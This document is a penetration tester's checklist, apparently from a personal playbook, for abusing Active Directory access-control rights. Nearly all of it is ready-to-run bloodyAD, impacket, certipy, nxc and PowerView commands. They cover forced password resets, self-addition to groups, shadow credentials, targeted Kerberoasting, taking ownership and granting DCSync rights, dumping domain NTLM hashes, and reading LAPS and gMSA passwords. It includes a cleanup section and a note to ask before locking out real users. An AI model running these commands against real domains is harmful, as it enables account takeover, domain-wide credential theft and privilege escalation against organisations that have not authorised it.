# AD ACL abuse

## Which right, which move
- [ ] The edge from BloodHound, or my node's Outbound Object Control, with its target as <TargetUser>, <Group> or <Computer>
- [ ] ForceChangePassword on a user: reset its password
- [ ] AddMember or AddSelf on a group: add myself
- [ ] GenericWrite on a user: shadow credentials, or a targeted roast
- [ ] GenericWrite or GenericAll on a computer: resource-based constrained delegation
- [ ] GenericAll: any of the above
- [ ] WriteOwner: take ownership, then WriteDacl
- [ ] WriteDacl: grant myself GenericAll, or DCSync on the domain itself
- [ ] ReadLAPSPassword or ReadGMSAPassword: read the password
- [ ] What I change, noted for the clean up at the end
bloodyAD takes an NT hash as -p ':<Hash>'.
bloodyAD --host <DCIP> -d <Domain> -u '<Username>' -p '<Password>' get writable --detail

## ForceChangePassword
bloodyAD --host <DCIP> -d <Domain> -u '<Username>' -p '<Password>' set password '<TargetUser>' 'Pwned123!'
net rpc password '<TargetUser>' 'Pwned123!' -U '<Domain>/<Username>%<Password>' -S <DCIP>
nxc smb <DCIP> -u '<TargetUser>' -p 'Pwned123!'
- [ ] The real user is locked out by this: on a real test, ask first, and prefer shadow credentials

## Shadow credentials, with GenericWrite
At the pwn-broker prompt first: tool install certipy, and tool install targetedkerberoast for the roast below.
The account's NT hash, with no reset and no cracking. certipy adds a key, logs in with it, and takes it off again.
certipy shadow auto -u '<Username>@<Domain>' -p '<Password>' -dc-ip <DCIP> -account '<TargetUser>'
- [ ] Needs a DC on Server 2016 or later with a certificate for PKINIT, so a CA in the domain
- [ ] KDC_ERR_PADATA_TYPE_NOSUPP: no PKINIT, so a targeted roast instead
targetedKerberoast -d <Domain> -u '<Username>' -p '<Password>' --dc-ip <DCIP> --request-user '<TargetUser>' -o targeted.txt
- [ ] The hash cracked as in :Pb kerberoasting, or pre-authentication turned off as in :Pb asrep

## AddMember or AddSelf on a group
bloodyAD --host <DCIP> -d <Domain> -u '<Username>' -p '<Password>' add groupMember '<Group>' '<Username>'
net rpc group addmem '<Group>' '<Username>' -U '<Domain>/<Username>%<Password>' -S <DCIP>
net rpc group members '<Group>' -U '<Domain>/<Username>%<Password>' -S <DCIP>
- [ ] Groups are read at logon: a new shell or a new ticket before the group's rights apply

## WriteOwner
Note the owner first, to put it back.
bloodyAD --host <DCIP> -d <Domain> -u '<Username>' -p '<Password>' get object '<Group>' --attr nTSecurityDescriptor --resolve-sd
bloodyAD --host <DCIP> -d <Domain> -u '<Username>' -p '<Password>' set owner '<Group>' '<Username>'
impacket-owneredit -action write -new-owner '<Username>' -target '<Group>' '<Domain>/<Username>:<Password>' -dc-ip <DCIP>
- [ ] As owner I may change its DACL: WriteDacl next

## WriteDacl
bloodyAD --host <DCIP> -d <Domain> -u '<Username>' -p '<Password>' add genericAll '<Group>' '<Username>'
impacket-dacledit -action write -rights FullControl -principal '<Username>' -target '<Group>' '<Domain>/<Username>:<Password>' -dc-ip <DCIP>
- [ ] The same for a user or a computer: its name in place of <Group>
On the domain object itself, DCSync:
bloodyAD --host <DCIP> -d <Domain> -u '<Username>' -p '<Password>' add dcsync '<Username>'
impacket-secretsdump '<Domain>/<Username>:<Password>@<DCIP>' -just-dc-ntlm

## LAPS and gMSA
nxc ldap <DCIP> -u '<Username>' -p '<Password>' -M laps
nxc ldap <DCIP> -u '<Username>' -p '<Password>' --gmsa
- [ ] A LAPS password is the local Administrator's: nxc smb <TargetIP> -u Administrator -p 'THE-LAPS-PASSWORD' --local-auth
- [ ] A gMSA hash works as the account's NT hash, with the name ending in $: :Pb smb, where this credential works

## From a Windows shell
With PowerView loaded, as in :Pb domain-enum:
Set-DomainUserPassword -Identity '<TargetUser>' -AccountPassword (ConvertTo-SecureString 'Pwned123!' -AsPlainText -Force)
Add-DomainGroupMember -Identity '<Group>' -Members '<Username>'
Set-DomainObjectOwner -Identity '<Group>' -OwnerIdentity '<Username>'
Add-DomainObjectAcl -TargetIdentity '<Group>' -PrincipalIdentity '<Username>' -Rights All
- [ ] Not running as the user who holds the right: -Credential with a PSCredential for it

## Clean up
bloodyAD --host <DCIP> -d <Domain> -u '<Username>' -p '<Password>' remove groupMember '<Group>' '<Username>'
bloodyAD --host <DCIP> -d <Domain> -u '<Username>' -p '<Password>' remove genericAll '<Group>' '<Username>'
bloodyAD --host <DCIP> -d <Domain> -u '<Username>' -p '<Password>' remove dcsync '<Username>'
- [ ] The owner set back to the one I noted
- [ ] Every password reset listed for the report: the old one cannot be restored
- [ ] BloodHound collected again, the new accounts marked Owned, and the paths read again
